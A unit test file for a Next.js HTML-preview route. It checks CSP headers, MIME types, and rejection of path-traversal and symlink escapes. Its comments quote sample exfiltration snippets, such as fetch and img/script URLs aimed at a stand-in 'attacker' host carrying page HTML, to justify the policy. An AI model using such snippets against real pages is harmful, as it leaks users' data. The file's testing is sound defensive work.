/**
 * Phase 4 Phase 1.5 — /api/files/html-preview/[...segments] route.
 *
 * Coverage:
 *  - HTML file served with text/html (workspace + home scopes)
 *  - Sibling resources (css / png / js) served with right MIME
 *  - Path escape rejected (../../../etc/secret outside scope)
 *  - Symlink escape rejected
 *  - Malformed scope token → 400
 *  - Root baseDir → 403
 *  - Missing file → 404
 *  - Defense-in-depth headers (nosniff, CSP, frame-ancestors)
 *
 * Run: npx tsx --test src/__tests__/unit/html-preview-route.test.ts
 */

import { after, describe, it } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { randomUUID } from 'node:crypto';
import { NextRequest } from 'next/server';
import { GET } from '../../app/api/files/html-preview/[...segments]/route';
import { buildHtmlPreviewUrl } from '../../lib/html-preview-url';

const testRoot = path.join(os.tmpdir(), 'codepilot-html-preview-' + randomUUID());
const workspaceDir = path.join(testRoot, 'proj');
const assetsDir = path.join(workspaceDir, 'assets');
const outsideDir = path.join(testRoot, 'outside');

fs.mkdirSync(assetsDir, { recursive: true });
fs.mkdirSync(outsideDir, { recursive: true });
fs.writeFileSync(
  path.join(workspaceDir, 'index.html'),
  '<!doctype html><html><head><link rel=stylesheet href="./style.css"></head><body><img src="./assets/logo.png"></body></html>',
);
fs.writeFileSync(path.join(workspaceDir, 'style.css'), 'body { color: red; }');
fs.writeFileSync(path.join(assetsDir, 'logo.png'), Buffer.from([0x89, 0x50, 0x4e, 0x47]));
fs.writeFileSync(path.join(outsideDir, 'secret.txt'), 'do-not-leak');

after(() => {
  try {
    fs.rmSync(testRoot, { recursive: true, force: true });
  } catch {
    // ignore
  }
});

// Convert a built preview URL into the `{ params: { segments } }` Next.js
// hands the route, which is the only piece of dispatch the test needs to
// mimic. `url.replace('/api/files/html-preview/', '')` would also work but
// going through URL constructor keeps any future basePath changes honest.
function segmentsFromUrl(url: string): string[] {
  const u = new URL(url, 'http://localhost');
  const tail = u.pathname.replace('/api/files/html-preview/', '');
  return tail.split('/').map((s) => decodeURIComponent(s));
}

async function callRoute(url: string): Promise<Response> {
  const res = await GET(
    new NextRequest(new URL(url, 'http://localhost').toString()),
    { params: Promise.resolve({ segments: segmentsFromUrl(url) }) },
  );
  if (!res) {
    throw new Error(`route returned no response for ${url}`);
  }
  return res;
}

describe('html-preview route — workspace scope', () => {
  it('serves the HTML file with text/html + restrictive headers', async () => {
    const url = buildHtmlPreviewUrl(path.join(workspaceDir, 'index.html'), {
      kind: 'workspace',
      baseDir: workspaceDir,
    });
    const res = await callRoute(url);
    assert.equal(res.status, 200);
    assert.match(res.headers.get('content-type') ?? '', /^text\/html/);
    assert.equal(res.headers.get('x-content-type-options'), 'nosniff');
    assert.equal(res.headers.get('cache-control'), 'no-store');
    const csp = res.headers.get('content-security-policy') ?? '';
    assert.match(csp, /frame-ancestors 'self'/);
    assert.match(csp, /base-uri 'self'/);
    const body = await res.text();
    assert.match(body, /<!doctype html>/);
  });

  it('CSP starts from default-src \'none\' and only allows explicit static-resource families', async () => {
    // Round 3 lockdown: the previous `default-src 'self' data: blob:
    // https:` let every unspecified directive (connect / frame /
    // object / worker / manifest) fall through to that permissive
    // baseline. Codex flagged that interactive scripts could
    // fetch('https://attacker.com', { body: outerHTML }) and the CSP
    // wouldn't object. Rebuild with default-deny + explicit allows.
    const url = buildHtmlPreviewUrl(path.join(workspaceDir, 'index.html'), {
      kind: 'workspace',
      baseDir: workspaceDir,
    });
    const res = await callRoute(url);
    const csp = res.headers.get('content-security-policy') ?? '';
    assert.match(csp, /default-src 'none'/);
    // Explicit allow-lists for the static-resource families
    assert.match(csp, /img-src [^;]*https:/);
    assert.match(csp, /style-src [^;]*https:/);
    assert.match(csp, /font-src [^;]*https:/);
    assert.match(csp, /media-src [^;]*https:/);
    // Static mode: scripts disabled at CSP layer (sandbox is primary)
    assert.match(csp, /script-src 'none'/);
  });

  it('CSP denies network egress channels in both modes (connect / frame / object / worker)', async () => {
    // Round 3: the load-bearing exfiltration protection. Scripts in
    // interactive mode can manipulate the DOM but cannot reach out:
    // fetch / XHR / EventSource / WebSocket → connect-src; nested
    // iframes → frame-src; <object> / <embed> → object-src; Worker /
    // ServiceWorker / SharedWorker → worker-src; <link rel=manifest>
    // → manifest-src. All 'none' regardless of mode.
    const baseUrl = buildHtmlPreviewUrl(path.join(workspaceDir, 'index.html'), {
      kind: 'workspace',
      baseDir: workspaceDir,
    });
    for (const variant of ['', '?interactive=1']) {
      const res = await callRoute(baseUrl + variant);
      const csp = res.headers.get('content-security-policy') ?? '';
      for (const directive of [
        "connect-src 'none'",
        "frame-src 'none'",
        "object-src 'none'",
        "worker-src 'none'",
        "child-src 'none'",
        "manifest-src 'none'",
      ]) {
        assert.match(
          csp,
          new RegExp(directive.replace(/'/g, "'")),
          `expected "${directive}" in CSP for variant "${variant}"`,
        );
      }
    }
  });

  it('interactive=1 CSP permits scripts (self/inline/eval ONLY — no https)', async () => {
    // Round 4 lockdown: interactive mode does NOT allow https: in
    // script-src. Codex flagged that with https: open, a script
    // could `document.head.appendChild(<script src=https://attacker/?d=outerHTML>)`
    // and exfiltrate via URL even without `connect-src https:`. So
    // interactive scripts run from 'self' (the route, which only
    // serves files we authorized) + 'unsafe-inline' + 'unsafe-eval'.
    const baseUrl = buildHtmlPreviewUrl(path.join(workspaceDir, 'index.html'), {
      kind: 'workspace',
      baseDir: workspaceDir,
    });
    const res = await callRoute(`${baseUrl}?interactive=1`);
    const csp = res.headers.get('content-security-policy') ?? '';
    assert.match(csp, /script-src [^;]*'self'/);
    assert.match(csp, /script-src [^;]*'unsafe-inline'/);
    assert.match(csp, /script-src [^;]*'unsafe-eval'/);
    // The critical Round 4 assertion: no https: anywhere in script-src.
    assert.doesNotMatch(csp, /script-src [^;]*https:/);
    assert.doesNotMatch(csp, /script-src 'none'/);
  });

  it('interactive=1 CSP closes URL-shaped exfiltration via img/style/font/media', async () => {
    // The Round 4 finding: even with connect-src 'none', a script
    // could leak via <img src=https://attacker/?d=...>,
    // <link rel=stylesheet href=...>, <link rel=preload as=font>, or
    // <audio src=...>. All of those go through img/style/font/media-src
    // respectively, NOT connect-src. So interactive mode collapses
    // these directives to 'self' data: blob:.
    const baseUrl = buildHtmlPreviewUrl(path.join(workspaceDir, 'index.html'), {
      kind: 'workspace',
      baseDir: workspaceDir,
    });
    const res = await callRoute(`${baseUrl}?interactive=1`);
    const csp = res.headers.get('content-security-policy') ?? '';
    // Static mode allows https: here; interactive must NOT.
    assert.doesNotMatch(csp, /img-src [^;]*https:/);
    assert.doesNotMatch(csp, /style-src [^;]*https:/);
    assert.doesNotMatch(csp, /font-src [^;]*https:/);
    assert.doesNotMatch(csp, /media-src [^;]*https:/);
    // Local same-origin / inline / data URIs still allowed so the
    // page can still display its bundled assets.
    assert.match(csp, /img-src 'self' data: blob:/);
    assert.match(csp, /style-src 'self' 'unsafe-inline'/);
  });

  it('CSP never opens form-action or frame-ancestors regardless of mode', async () => {
    // These two directives are constraints we don't relax for
    // interactive mode — forms posting back to arbitrary endpoints
    // and iframes embedding into other origins are not part of the
    // "preview HTML in our app" contract.
    const baseUrl = buildHtmlPreviewUrl(path.join(workspaceDir, 'index.html'), {
      kind: 'workspace',
      baseDir: workspaceDir,
    });
    for (const variant of ['', '?interactive=1']) {
      const res = await callRoute(baseUrl + variant);
      const csp = res.headers.get('content-security-policy') ?? '';
      assert.match(csp, /form-action 'none'/, `form-action 'none' for variant "${variant}"`);
      assert.match(csp, /frame-ancestors 'self'/, `frame-ancestors 'self' for variant "${variant}"`);
    }
  });

  it('serves a sibling .css under the same scope token', async () => {
    const docUrl = buildHtmlPreviewUrl(path.join(workspaceDir, 'index.html'), {
      kind: 'workspace',
      baseDir: workspaceDir,
    });
    // Simulate what the browser resolves './style.css' to from the doc URL
    const cssUrl = docUrl.replace(/\/[^/]+$/, '/style.css');
    const res = await callRoute(cssUrl);
    assert.equal(res.status, 200);
    assert.match(res.headers.get('content-type') ?? '', /^text\/css/);
    const body = await res.text();
    assert.equal(body.trim(), 'body { color: red; }');
  });

  it('serves a nested .png under the same scope token', async () => {
    const docUrl = buildHtmlPreviewUrl(path.join(workspaceDir, 'index.html'), {
      kind: 'workspace',
      baseDir: workspaceDir,
    });
    // Simulate './assets/logo.png' resolved against the doc URL
    const imgUrl = docUrl.replace(/\/[^/]+$/, '/assets/logo.png');
    const res = await callRoute(imgUrl);
    assert.equal(res.status, 200);
    assert.equal(res.headers.get('content-type'), 'image/png');
    const buf = await res.arrayBuffer();
    assert.equal(buf.byteLength, 4);
  });

  it('rejects ../escape that lands outside the workspace scope', async () => {
    // Browser would resolve `../outside/secret.txt` from `proj/index.html`
    // to a URL whose decoded path lands at outsideDir/secret.txt. The
    // route's assertRealPathInBase must reject because realpath escapes
    // the workspace baseDir.
    const docUrl = buildHtmlPreviewUrl(path.join(workspaceDir, 'index.html'), {
      kind: 'workspace',
      baseDir: workspaceDir,
    });
    // Replace 'proj/index.html' with 'outside/secret.txt' at the tail
    const escapedUrl = docUrl.replace(/proj\/index\.html$/, 'outside/secret.txt');
    const res = await callRoute(escapedUrl);
    assert.equal(res.status, 403);
    const body = await res.json();
    assert.equal(body.code, 'symlink_escape');
  });

  it('rejects a symlink that escapes the workspace', async () => {
    // Plant a symlink inside the workspace pointing at outsideDir/secret.txt.
    // realpath should follow it and assertRealPathInBase should reject
    // because the real target is outside baseDir.
    const linkPath = path.join(workspaceDir, 'link.html');
    try {
      fs.symlinkSync(path.join(outsideDir, 'secret.txt'), linkPath);
    } catch (err) {
      // On systems / FS that disallow symlinks, skip this assertion.
      if ((err as NodeJS.ErrnoException).code === 'EPERM') return;
      throw err;
    }
    try {
      const url = buildHtmlPreviewUrl(linkPath, {
        kind: 'workspace',
        baseDir: workspaceDir,
      });
      const res = await callRoute(url);
      assert.equal(res.status, 403);
      const body = await res.json();
      assert.equal(body.code, 'symlink_escape');
    } finally {
      fs.unlinkSync(linkPath);
    }
  });

  it('returns 404 for a sibling that does not exist on disk', async () => {
    const docUrl = buildHtmlPreviewUrl(path.join(workspaceDir, 'index.html'), {
      kind: 'workspace',
      baseDir: workspaceDir,
    });
    const missing = docUrl.replace(/\/[^/]+$/, '/missing.css');
    const res = await callRoute(missing);
    assert.equal(res.status, 404);
  });

  it('rejects root baseDir (workspace token encoding a filesystem root)', async () => {
    const url = buildHtmlPreviewUrl('/index.html', {
      kind: 'workspace',
      baseDir: '/', // would let the iframe walk the whole filesystem
    });
    const res = await callRoute(url);
    assert.equal(res.status, 403);
    const body = await res.json();
    assert.equal(body.code, 'root_base_dir');
  });

  it('returns 400 when the scope token is unrecognized', async () => {
    const url = '/api/files/html-preview/totally-not-a-scope/proj/index.html';
    const res = await callRoute(url);
    assert.equal(res.status, 400);
    const body = await res.json();
    assert.equal(body.code, 'malformed_url');
  });
});

// Module-level setup for the home-scope suite — node:test's
// module-scoped `after` (imported above) cleans up.
const originalHome = process.env.HOME;
const originalUserProfile = process.env.USERPROFILE;
const isolatedHome = path.join(process.cwd(), '.codepilot-test-html-home-' + randomUUID());
process.env.HOME = isolatedHome;
process.env.USERPROFILE = isolatedHome;
const homeExternalDir = path.join(isolatedHome, 'external');
fs.mkdirSync(homeExternalDir, { recursive: true });
fs.writeFileSync(
  path.join(homeExternalDir, 'desktop.html'),
  '<!doctype html><html><body><h1>External</h1></body></html>',
);
after(() => {
  try { fs.rmSync(homeExternalDir, { recursive: true, force: true }); } catch {}
  try { fs.rmSync(isolatedHome, { recursive: true, force: true }); } catch {}
  if (originalHome === undefined) delete process.env.HOME;
  else process.env.HOME = originalHome;
  if (originalUserProfile === undefined) delete process.env.USERPROFILE;
  else process.env.USERPROFILE = originalUserProfile;
});

describe('html-preview route — home scope', () => {
  it('serves an in-home external HTML file', async () => {
    const url = buildHtmlPreviewUrl(path.join(homeExternalDir, 'desktop.html'), { kind: 'home' });
    const res = await callRoute(url);
    assert.equal(res.status, 200);
    const body = await res.text();
    assert.match(body, /<h1>External<\/h1>/);
  });

  it('rejects an out-of-home path even with home scope token', async (t) => {
    // Try to escape out of $HOME via /tmp. Real-path of /tmp is outside
    // homedir → assertRealPathInBase rejects.
    const home = path.resolve(os.homedir());
    const outsideBase = [os.tmpdir(), process.cwd()].find((candidate) => {
      const relative = path.relative(home, path.resolve(candidate));
      return relative === '..'
        || relative.startsWith(`..${path.sep}`)
        || path.isAbsolute(relative);
    });
    if (!outsideBase) {
      t.skip('No writable path outside the user home is available on this host');
      return;
    }
    const outsideHome = path.join(outsideBase, '.codepilot-out-of-home-' + randomUUID());
    fs.mkdirSync(outsideHome, { recursive: true });
    fs.writeFileSync(path.join(outsideHome, 'leak.html'), '<h1>leak</h1>');
    try {
      const url = buildHtmlPreviewUrl(path.join(outsideHome, 'leak.html'), { kind: 'home' });
      const res = await callRoute(url);
      assert.equal(res.status, 403);
    } finally {
      fs.rmSync(outsideHome, { recursive: true, force: true });
    }
  });
});
